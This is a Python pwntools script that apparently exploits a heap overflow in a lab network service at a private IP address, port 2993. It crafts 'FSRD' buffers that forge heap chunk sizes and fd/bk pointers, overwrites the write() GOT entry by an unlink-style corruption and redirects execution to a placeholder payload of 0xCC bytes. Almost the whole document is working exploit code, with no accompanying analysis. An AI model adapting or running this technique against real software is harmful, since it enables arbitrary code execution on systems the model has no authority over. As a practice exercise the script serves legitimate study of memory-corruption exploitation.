

from pwn import *


# 0x44525346 == "FSRD"

context.log_level = logging.DEBUG
conn = remote("192.168.179.129", 2993)

chunk_sz = 128 + 8 # == 136 == 0x88

def assert_buf(buf):
    assert(len(buf) == chunk_sz - 8)
    assert(buf.startswith(b'FSRD'))


def generate_simple_buffer(content=b''):
    """
    Generates the first instance of buf that is to be sent to the target program
    It sets the ground for further buffers in order to be able to overwrite heap metadata
    """
    chunk_prefix = b'FSRD'
    chunk_suffix = b'/ROOT\x00'
    chunk = (
        chunk_prefix +
        content +
        bytearray(
            "A"*(chunk_sz - 8 - len(chunk_prefix) - len(content) - len(chunk_suffix)),
            encoding="ascii"
        ) +
        chunk_suffix
    )
    return chunk

def generate_buffer(prev_sz, sz, fd=b'FSRD', bk=b'AAAA'):
    """
    Generates an instance of buf variable that when sent to the target
    program, will allocate a heap chunks, which will have the given
    prev_sz and sz metadata
    prev_sz (bytes)
    sz (bytes)

    Returns the generated buffer
    """
    chunk_prefix = b'FSRDDRSFROOT'
    chunk_suffix = b'/ROOT\x00'
    chunk_payload = (
        b'/' + 
        bytearray(
            "D"*(len(chunk_suffix) - 1),   # -1 since we also copy the '/' character
            encoding="ascii"
        ) +
        prev_sz +
        sz +
        fd +
        bk +
        b'\x00' # This byte will not be coppied over
    )
    chunk = (
        chunk_prefix +
        chunk_payload +
        bytearray(
            "A"*(chunk_sz - 8 - len(chunk_prefix) - len(chunk_payload) - len(chunk_suffix)),
            encoding="ascii"
        ) +
        chunk_suffix
    )
    assert_buf(chunk)
    return chunk

# get_max_fast() returns at least 64


chunk0 = generate_simple_buffer()
conn.send(chunk0)

write__got_plt = 0x0804d41c
payload_offset = 0x20   # executable payload offset within buf
chunk3_addr = 0x0804e198


chunk1 = generate_buffer(
    pack(0xFFFFFF76, 32, 'little', False),    # prev_sz
    pack(0x00000089, 32, 'little', False)     # sz
)
conn.send(chunk1)


chunk2 = generate_buffer(
    pack(0xFFFFFF76, 32, 'little', False),    # prev_sz == -0x88
    pack(0xFFFFFFF4, 32, 'little', False),    # sz      == -7 - 4 == -11
    pack(write__got_plt - 12, 32, 'little', False),    # fd
    pack(chunk3_addr + 8 + payload_offset, 32, 'little', False)     # bk. Also skip metadata
)
conn.send(chunk2)

chunk3 = (
    b'A'*(payload_offset) + 
    b'\xCC'*12
)
conn.send(chunk3)

conn.interactive()

conn.close()
